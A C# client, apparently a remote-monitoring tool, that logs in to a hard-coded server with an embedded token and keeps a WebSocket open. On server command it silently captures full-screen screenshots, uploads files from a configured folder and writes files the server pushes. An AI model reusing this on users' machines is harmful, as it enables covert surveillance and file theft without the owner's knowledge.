using JASONParser;
using System;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using WebSocketSharp;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.IO;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using EventLogger;
using System.Net;
using System.Threading;

namespace ImageSender
{
    public class imageSender
    {
        static WebSocket ws;
        private static ComputerInfo comp = new ComputerInfo();
        private static Parser parser = new Parser();
        private static JToken result;



        public void conn()
        {

            if (logIn() == 0)
            {
                MessageBox.Show("Error");
                return;
            }

            ws = new WebSocket(url: "ws://109.237.39.237:25565", onMessage: OnMessage, onError: OnError);
            ws.SetCookie(new WebSocketSharp.Net.Cookie("cookie", "594bd055-a29f-41c6-aac9-3d34ca4b96e6"));
            ws.Connect().Wait();
            TimeSpan startTimeSpan = TimeSpan.Zero;
            TimeSpan periodTimeSpan = TimeSpan.FromMilliseconds(30000);

            System.Threading.Timer timer = new System.Threading.Timer((e) =>
            {
                ws.Send("{ \"type\":\"" + "pong" + "\"}");
            }, null, startTimeSpan, periodTimeSpan);


            sendMessage("sendCredentials", "");



        }

        private Task OnError(WebSocketSharp.ErrorEventArgs arg)
        {
            throw new NotImplementedException();
        }

        private static Task OnMessage(MessageEventArgs messageEventArgs)
        {
            string text = messageEventArgs.Text.ReadToEnd();
            result = JsonConvert.DeserializeObject<JToken>(text);
            if (result["type"].Value<String>() == "Connected") return Task.FromResult(0);
            else if (result["type"].Value<String>() == "ping")
            {
                //sendMessage("pong", "");
                return Task.FromResult(0);
            }
            else if (result["type"].Value<String>() == "Disconnected") { return Task.FromResult(0); }

            if (result["type"].Value<String>() == "command") sendMessage("command_result", "radi");

            else if (result["type"].Value<String>() == "getScreenshot") sendScreenshot();
            else if (result["type"].Value<String>() == "getFile") sendFile(result["path"].Value<String>(), result["fileName"].Value<String>());
            else if (result["type"].Value<String>() == "getFileDirect") sendFile(result["path"].Value<String>(), result["fileName"].Value<String>(), "sendFileDirect");
            else if (result["type"].Value<String>() == "putFile") getFile(result["data"].Value<String>(), result["path"].Value<String>(), result["fileName"].Value<String>());
            else if (result["type"].Value<String>() != "Connected") sendMessage("empty", "Komanda ne postoji");

            Logger logger = new Logger(result["type"].Value<String>(), result["user"].Value<String>());
            logger.writeLog();

            return Task.FromResult(0);
        }

        private static void sendScreenshot()
        {

            var captureBmp = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
            using (var captureGraphic = Graphics.FromImage(captureBmp))
            {
                captureGraphic.CopyFromScreen(0, 0, 0, 0, captureBmp.Size);
                captureBmp.Save("capture.jpg", ImageFormat.Jpeg);
            }
            //potrebno podesit putanju slike
            using (Image image = Image.FromFile(@"capture.jpg"))
            {

                using (MemoryStream m = new MemoryStream())
                {

                    image.Save(m, image.RawFormat);
                    byte[] imageBytes = m.ToArray();

                    string base64String = Convert.ToBase64String(imageBytes);

                    sendMessage("sendScreenshot", base64String);

                }
            }
        }
        private static void sendMessage(string type, string message)
        {
            comp = parser.ConfigParser();

            ws.Send("{ \"type\":\"" + type + "\", \"message\":\"" + message + "\", \"name\":\"" + comp.name + "\", \"location\":\"" + comp.location + "\", \"ip\":\"" + "ip" + "\", \"path\":\"" + comp.fileLocations.File1 + "\"}");
        }

        private static void sendFile(String path, String fileName, String type = "sendFile")
        {
            String abspath = comp.fileLocations.File1 + "\\" + path + fileName;
            byte[] bytes = System.IO.File.ReadAllBytes(abspath);
            string base64String = Convert.ToBase64String(bytes);

            ws.Send("{ \"type\":\"" + type + "\", \"message\":\"" + base64String + "\", \"name\":\"" + comp.name + "\", \"location\":\"" + comp.location + "\", \"ip\":\"" + "ip" + "\", \"fileName\":\"" + fileName + "\"}");
        }

        private static void getFile(String base64String, String path, String fileName)
        {
            String abspath = comp.fileLocations.File1 + "\\" + path + fileName;
            byte[] bytes = Convert.FromBase64String(base64String);
            File.WriteAllBytes(abspath, bytes);

            //ovdje trebam vratiti ws ono sto njima treba 
            ws.Send("{ \"type\":\"" + "savedFile" + "\", \"message\":\"" + "fileSaved" + "\", \"name\":\"" + comp.name + "\", \"location\":\"" + comp.location + "\", \"ip\":\"" + "ip" + "\"}");

        }

        private static int logIn()
        {
            try
            {
                var httpWebRequest = (HttpWebRequest)WebRequest.Create("http://109.237.39.237:25565/login");

                httpWebRequest.ContentType = "application/json";
                httpWebRequest.Method = "POST";
                CookieContainer cok = new CookieContainer();
                httpWebRequest.CookieContainer = cok;
                httpWebRequest.AllowAutoRedirect = false;
                httpWebRequest.Headers.Add("Authorization", "594bd055-a29f-41c6-aac9-3d34ca4b96e6");

                using (var streamWriter = new

                StreamWriter(httpWebRequest.GetRequestStream()))
                {
                    string json = "{ \"id\":\"" + "594bd055-a29f-41c6-aac9-3d34ca4b96e6" + "\"}";

                    streamWriter.Write(json);
                }
                var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();

                return 1;
            }
            catch (Exception E)
            {
                return 0;
            }
        }
    }
}